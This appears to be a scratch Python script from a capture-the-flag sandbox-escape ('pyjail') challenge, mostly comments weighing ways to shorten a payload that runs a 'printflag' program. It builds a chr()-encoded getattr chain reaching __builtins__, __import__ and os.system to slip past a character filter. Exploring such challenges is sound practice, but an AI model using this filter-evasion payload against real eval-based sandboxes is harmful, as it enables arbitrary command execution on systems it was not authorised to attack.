#!/usr/bin/env python3

# We need a much shorter payload. Let's think...
# We can use [x for x in ...] comprehensions? No, that uses "for" and spaces
# We can assign with walrus? No, that uses = which is forbidden

# What if we access __builtins__ through a shorter path?
# globals()['__builtins__']?  But we need chr() for underscores

# Let's try the absolute shortest version:
# ()[chr(95)*2+chr(99)...] might give us __class__
# But that's still long

# Alternative: what if 'printflag' is already executable and we use some other method?

# Actually, let's check: can we use eval with a shorter constructed string?
# eval(chr(95)+...whole thing...)  - still long

# What about using abbreviations?
# Instead of './printflag', just 'printflag'?
printflag_short = "chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(102)+chr(108)+chr(97)+chr(103)"
print(f"'printflag' = {printflag_short} ({len(printflag_short)} chars)")

# What if we use bytes instead of chr for everything?
# bytes([95,95,...])
# Let's calculate the ASCII values we need:
import_bytes = [95,95,105,109,112,111,114,116,95,95]  # __import__
os_bytes = [111,115]  # os  
system_bytes = [115,121,115,116,101,109]  # system
printflag_bytes = [112,114,105,110,116,102,108,97,103]  # printflag

# Try constructing with getattr and bytes
# But bytes() returns bytes, not str, so getattr won't work directly
# We'd need .decode() which uses a dot...

# What about using format strings or other tricks?
# No, format needs {} which is forbidden

# Hmm, what if we construct a lambda or use exec differently?
# exec needs the code as a string, which is still long to construct

# Let me try the most compact version I can think of:
# Use single-letter variable refs where possible, minimize chr() calls

# Actually wait - what if we just pass the command differently?
# Like using os.popen or subprocess.run?
# Still need to import though

# Let me calculate: shortest possible __import__ access
print(f"\nShortest __import__ access:")
print(f"  getattr(vars()[chr(95)*2+chr(98)+...], chr(95)*2+chr(105)+...)")

# Actually, let's just try the most direct thing even if long:
compact = "getattr(getattr(getattr(vars(),chr(95)*2+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)*2),chr(95)*2+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)*2)(chr(111)+chr(115)),chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(102)+chr(108)+chr(97)+chr(103))"

print(f"\nCompact payload: {len(compact)} chars")

# Hmm, still too long. What if the challenge doesn't actually check length for some inputs?
# Or what if there's a bug we can exploit?
